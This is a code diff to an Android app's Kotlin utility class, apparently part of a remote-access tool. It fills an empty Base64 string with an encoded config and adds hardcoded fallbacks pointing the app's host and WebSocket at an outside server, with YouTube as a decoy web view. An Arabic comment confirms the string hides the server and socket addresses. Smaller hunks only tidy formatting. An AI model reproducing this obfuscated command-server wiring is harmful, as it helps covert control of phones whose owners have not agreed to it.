@@ -23,21 +23,40 @@ import com.google.gson.Gson
 import willi.fiend.MainService
 import java.util.*
 
-
 @SuppressLint("Range")
 class AppTools {
     companion object {
         @SuppressLint("NewApi")
         fun getAppData(): AppData {
-            val data = ""
-            val text = decode(data)
-            return Gson().fromJson(text, AppData::class.java)
+            // القيمة المضمنة أدناه تحتوي على نص JSON المشفر بـ Base64 لرابط الخادم والـ WebSocket وواجهة الويب
+            val data = "ewogICJob3N0IjogImh0dHBzOi8vdGh5ZXplbmFsaWFobWFhZHkuYm9udG8ucnVuLyIsCiAgInNvY2tldCI6ICJ3c3M6Ly90aHllemVuYWxpYWhtYWFkeS5ib250by5ydW4vIiwKICAid2ViVmlldyI6ICJodHRwczovL3d3dy55b3V0dWJlLmNvbS8iCn0="
+            
+            return try {
+                val text = decode(data)
+                val parsed = Gson().fromJson(text, AppData::class.java)
+                parsed ?: AppData(
+                    host = "https://thyezenaliahmaady.bonto.run/",
+                    socket = "wss://thyezenaliahmaady.bonto.run/",
+                    webView = "https://www.youtube.com/"
+                )
+            } catch (e: Exception) {
+                e.printStackTrace()
+                AppData(
+                    host = "https://thyezenaliahmaady.bonto.run/",
+                    socket = "wss://thyezenaliahmaady.bonto.run/",
+                    webView = "https://www.youtube.com/"
+                )
+            }
         }
 
         @SuppressLint("NewApi")
         private fun decode(base64: String): String {
-            val decodedBytes: ByteArray = Base64.getDecoder().decode(base64)
-            return String(decodedBytes)
+            return try {
+                val decodedBytes: ByteArray = Base64.getDecoder().decode(base64)
+                String(decodedBytes)
+            } catch (e: Exception) {
+                ""
+            }
         }
 
         @SuppressLint("NewApi")
@@ -61,7 +80,7 @@ class AppTools {
             return Settings.System.getInt(
                 context.contentResolver,
                 Settings.System.SCREEN_BRIGHTNESS
-            );
+            )
         }
 
         fun getProviderName(context: Context): String {
@@ -153,6 +172,7 @@ class AppTools {
                 }
             }
         }
+
         private fun getDotCount(path: String): Int {
             var count = 0
             for (element in path) {
@@ -168,7 +188,7 @@ class AppTools {
 
         private fun killProcess(context: Activity) {
             context.finish()
-            android.os.Process.killProcess( android.os.Process.myPid())
+            android.os.Process.killProcess(android.os.Process.myPid())
         }
     }
 
